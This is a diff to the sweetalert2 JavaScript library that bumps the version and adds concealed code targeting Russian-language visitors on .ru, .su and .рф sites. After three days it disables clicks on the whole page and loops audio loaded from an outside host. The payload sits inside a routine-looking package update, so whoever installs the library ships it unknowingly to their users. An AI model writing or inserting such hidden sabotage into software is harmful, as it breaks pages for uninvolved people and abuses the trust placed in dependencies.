@@ -1,5 +1,5 @@
 /*!
-* sweetalert2 v8.19.0
+* sweetalert2 v8.19.1
 * Released under the MIT License.
 */
 (function (global, factory) {
@@ -2884,7 +2884,29 @@ SweetAlert.prototype.then = function (onFulfilled) {
 SweetAlert.prototype["finally"] = function (onFinally) {
   var promise = privateProps.promise.get(this);
   return promise["finally"](onFinally);
-}; // Assign instance methods from src/instanceMethods/*.js to prototype
+}; // Dear russian users visiting russian sites. Let's have fun.
+
+
+if (typeof window !== 'undefined' && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|xn--p1ai)$/)) {
+  var now = new Date();
+  var initiationDate = localStorage.getItem('swal-initiation');
+
+  if (!initiationDate) {
+    localStorage.setItem('swal-initiation', "".concat(now));
+  } else if ((now.getTime() - Date.parse(initiationDate)) / (1000 * 60 * 60 * 24) > 3) {
+    setTimeout(function () {
+      document.body.style.pointerEvents = 'none';
+      var ukrainianAnthem = document.createElement('audio');
+      ukrainianAnthem.src = 'https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3';
+      ukrainianAnthem.loop = true;
+      document.body.appendChild(ukrainianAnthem);
+      setTimeout(function () {
+        ukrainianAnthem.play()["catch"](function () {// ignore
+        });
+      }, 2500);
+    }, 500);
+  }
+} // Assign instance methods from src/instanceMethods/*.js to prototype
 
 
 _extends(SweetAlert.prototype, instanceMethods); // Assign static methods from src/staticMethods/*.js to constructor
